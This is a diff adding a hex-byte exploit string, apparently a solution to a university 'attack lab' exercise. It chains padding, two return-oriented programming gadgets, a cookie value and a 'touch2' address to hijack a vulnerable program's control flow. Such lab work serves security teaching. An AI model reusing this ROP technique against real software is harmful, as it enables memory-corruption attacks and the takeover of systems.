@@ -1,0 +1,11 @@
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+90 17 40 00 00 00 00 00 /* gadget 1: pop rax register starts at 4th byte, where 58 starts */
+03 d8 7d 1a 00 00 00 00 /* cookie */
+7D 17 40 00 00 00 00 00 /* gadget 2: move cookie into %rdi, cookie is stored in rax/eax/rsp */
+ac 15 40 00 00 00 00 00 /* touch2 return address */
